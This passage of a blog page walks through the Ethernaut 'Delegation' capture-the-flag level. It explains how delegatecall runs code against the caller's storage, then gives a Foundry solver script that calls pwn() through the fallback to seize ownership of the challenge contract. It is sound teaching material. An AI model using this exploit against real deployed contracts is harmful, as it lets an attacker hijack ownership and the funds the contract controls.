+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Delegate</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">pwn</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Delegation</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Delegate</span> <span class="n">delegate</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_delegateAddress</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">delegate</span> <span class="o">=</span> <span class="n">Delegate</span><span class="p">(</span><span class="n">_delegateAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">delegate</span><span class="p">).</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>the challenge description tell us to learn about the <code>delegatecall</code> low level function</p>
+<p>we should understand when a contract make an external call to an another contract there are 3 types of calls that can happen : call, delegate call and static call</p>
+<p>when a call is created it starts an  <code>execution context</code></p>
+<p>the execution context is simply the environment in the <code>evm</code> where the function runs, it determines the state variables we can access and many other things</p>
+<p>when working with delegate calls the function runs in the context of the contract that is making the call , so if contract A calls contract B , contract B can access the state variables of contract A , this is useful in certain cases but can be dangerous too</p>
+<p>getting back to our challenge lets first determine which contract instance we have</p>
+<p>this is the <code>bytecode</code> for the contract address we have :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://localhost:1313/ethernaut/delegation/bytecode.png"
+        data-srcset="http://localhost:1313/ethernaut/delegation/bytecode.png, http://localhost:1313/ethernaut/delegation/bytecode.png 1.5x, http://localhost:1313/ethernaut/delegation/bytecode.png 2x"
+        data-sizes="auto"
+        alt="http://localhost:1313/ethernaut/delegation/bytecode.png"
+        title="http://localhost:1313/ethernaut/delegation/bytecode.png" /></p>
+<p>now we check if the function selector for the function <code>pwn()</code> is in it or not</p>
+<p>1- if the selector is in the code then we are given the address for <code>Delegate</code>
+2- otherwise we are given the address for <code>Delegation</code></p>
+<p>we check that using python :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://localhost:1313/ethernaut/delegation/selector-check.png"
+        data-srcset="http://localhost:1313/ethernaut/delegation/selector-check.png, http://localhost:1313/ethernaut/delegation/selector-check.png 1.5x, http://localhost:1313/ethernaut/delegation/selector-check.png 2x"
+        data-sizes="auto"
+        alt="http://localhost:1313/ethernaut/delegation/selector-check.png"
+        title="http://localhost:1313/ethernaut/delegation/selector-check.png" /></p>
+<p>since it returned False we can confirm that we have the address for the Delegation contract and we should claim ownership of this contract</p>
+<p>In solidity state variables are laid in slots, each slot is 32 bytes</p>
+<p>when contract A delegates to contract B, B code will run but treats A storage as its own</p>
+<p>if B have 5 state variables defined, when the code is running, if it modifies the first state variable this will overrides A storage slot 0 , if we modify the 2nd state variable it overrides storage slot 1 , and so on</p>
+<p>so if we trigger the fallback function of contract A</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">delegate</span><span class="p">).</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>this will delegates to contract B , if we set <code>msg.data</code> to the function selector of <code>pwn()</code>
+this way the function pwn will get executed in context of contract A, so the value given to the state variable <code>owner</code> of contract B will be set to the storage slot 0 of contract A , and what state variable of A we have in the slot 0 ?</p>
+<p>Yes <code>owner</code> !!! , so we claim ownership</p>
+<p>now to make this exploit complete, lets recall when fallback is called</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://localhost:1313/ethernaut/delegation/fallback-flow.png"
+        data-srcset="http://localhost:1313/ethernaut/delegation/fallback-flow.png, http://localhost:1313/ethernaut/delegation/fallback-flow.png 1.5x, http://localhost:1313/ethernaut/delegation/fallback-flow.png 2x"
+        data-sizes="auto"
+        alt="http://localhost:1313/ethernaut/delegation/fallback-flow.png"
+        title="http://localhost:1313/ethernaut/delegation/fallback-flow.png" /></p>
+<p>just add a note that in the case where <code>msg.data</code> is not empty
+fallback get executed only if the given selector don&rsquo;t match any function signature that exists in the contract code</p>
+<p>so if we pass <code>msg.data = selector of pwn()</code> since this matches no function in contract A, fallback will get executed, and it will delegate calls the function <code>pwn()</code> of contract B because of this line :</p>
+<p><code>(bool result,) = address(delegate).delegatecall(msg.data);</code></p>
+<p>and one important last note to add is that running the execution of this call , <code>msg.sender</code> will be our address , not the contract A address , because this is how delegate call works</p>
+<p>now we create the solver script using forge script :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../src/Delegation.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Solver</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Delegation</span> <span class="n">instance</span> <span class="o">=</span> <span class="n">Delegation</span><span class="p">(</span><span class="mh">0xc8265024cb3Ba61f254368EcBe9e131DFdf21eE3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">&#34;PRIVATE_KEY&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">     <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">instance</span><span class="p">.</span><span class="n">owner</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">     <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span> <span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">).</span><span class="nb">call</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSignature</span><span class="p">(</span><span class="s">&#34;pwn()&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">     <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">instance</span><span class="p">.</span><span class="n">owner</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>after running this locally :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="http://localhost:1313/ethernaut/delegation/solution-success.png"
+        data-srcset="http://localhost:1313/ethernaut/delegation/solution-success.png, http://localhost:1313/ethernaut/delegation/solution-success.png 1.5x, http://localhost:1313/ethernaut/delegation/solution-success.png 2x"
+        data-sizes="auto"
+        alt="http://localhost:1313/ethernaut/delegation/solution-success.png"
+        title="http://localhost:1313/ethernaut/delegation/solution-success.png" /></p>
+<p>we can see that we claimed ownership successfully so GG! the challenge is solved</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info"><div class="post-info-tag"><span><a href="/tags/ethernaut/">Ethernaut</a>
+                </span><span><a href="/tags/solidity/">Solidity</a>
+                </span><span><a href="/tags/delegatecall/">Delegatecall</a>
+                </span><span><a href="/tags/evm/">Evm</a>
+                </span><span><a href="/tags/storage-slots/">Storage-Slots</a>
+                </span></div><div class="post-info-line"><div class="post-info-mod">
+                <span>Updated on 2026-01-07</span>
+            </div><div class="post-info-mod"></div>
+        </div><div class="post-info-share">
+            <span><a href="#" onclick="return false;" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/ethernaut/delegation/" data-hashtag="ethernaut"><i class="fa-brands fa-facebook-square fa-fw"></i></a><a href="#" onclick="return false;" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/ethernaut/delegation/"><i class="fa-brands fa-linkedin fa-fw"></i></a></span>
+        </div></div><div class="related-content">
+            <h3 class="related-title">See Also</h3>
+            <div class="related-posts"><a class="related-post" href="/posts/ethernaut/"><div class="related-post-image-placeholder">
+                                <i class="fa-solid fa-newspaper"></i>
+                            </div><div class="related-post-content">
+                            <span class="related-post-title">Ethernaut</span>
+                        </div>
+                    </a><a class="related-post" href="/ethernaut/force/"><div class="related-post-image-placeholder">
+                                <i class="fa-solid fa-newspaper"></i>
+                            </div><div class="related-post-content">
+                            <span class="related-post-title">Force</span>
+                        </div>
+                    </a><a class="related-post" href="/ethernaut/gatekeeper-one/"><div class="related-post-image-placeholder">
+                                <i class="fa-solid fa-newspaper"></i>
+                            </div><div class="related-post-content">
+                            <span class="related-post-title">Gatekeeper One</span>
+                        </div>
+                    </a><a class="related-post" href="/ethernaut/magic-number/"><div class="related-post-image-placeholder">
+                                <i class="fa-solid fa-newspaper"></i>
+                            </div><div class="related-post-content">
+                            <span class="related-post-title">Magic Number</span>
+                        </div>
+                    </a><a class="related-post" href="/ethernaut/token/"><div class="related-post-image-placeholder">
+                                <i class="fa-solid fa-newspaper"></i>
+                            </div><div class="related-post-content">
+                            <span class="related-post-title">Token</span>
+                        </div>
+                    </a></div>
+        </div><div class="post-nav"><a href="/ethernaut/force/" class="prev" rel="prev" title="Force"><i class="fa-solid fa-angle-left fa-fw"></i>Previous Post</a>
+            <a href="/ethernaut/elevator/" class="next" rel="next" title="Elevator">Next Post<i class="fa-solid fa-angle-right fa-fw"></i></a></div></div>
+</div></article></div>
+            </main>
+            <footer class="footer"><div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.164.0 (ce2470e7012b5ab5fc4e10ebe4027e9f8d9e00dc)">Hugo</a> | Theme - <a href="https://github.com/khusika/FeelIt" target="_blank" rel="noopener noreffer" title="FeelIt 1.0.3"><i class="fa-solid fa-hand-holding-heart fa-fw"></i> FeelIt</a>
+        </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/">Koyphshi</a></span></div>
+</div>
+</footer>
+        </div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fa-solid fa-chevron-up fa-fw"></i>
+            </a></div><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/css/custom.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/auto-render.min.js"></script><script src="/lib/katex/copy-tex.min.js"></script><script src="/lib/katex/mhchem.min.js"></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body></html>
